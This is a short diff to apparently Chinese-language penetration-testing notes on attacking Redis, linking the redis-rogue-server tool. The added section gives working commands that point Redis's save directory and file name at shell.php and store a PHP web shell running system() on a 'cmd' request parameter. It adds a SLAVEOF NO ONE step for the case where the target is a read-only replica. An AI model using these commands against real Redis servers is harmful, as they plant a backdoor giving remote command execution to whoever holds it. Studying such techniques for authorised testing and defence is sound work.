@@ -14,14 +14,17 @@ config get dir (配置文件所在的目录)
 https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----49920d4188de--------------------------------
 
 
-
-
-
-
-
-
-
-
+**Redis Shell 写 WebShell**
+```bash
+config set dir "C:/xxxxxxx"
+CONFIG SET dbfilename shell.php
+SET webshell "<?php system($_GET['cmd']); ?>"
+save
+```
+如果出现 `(error) READONLY You can't write against a read only slave.` 的错误，尝试
+```
+SLAVEOF NO ONE
+```
 
 # 利用
 
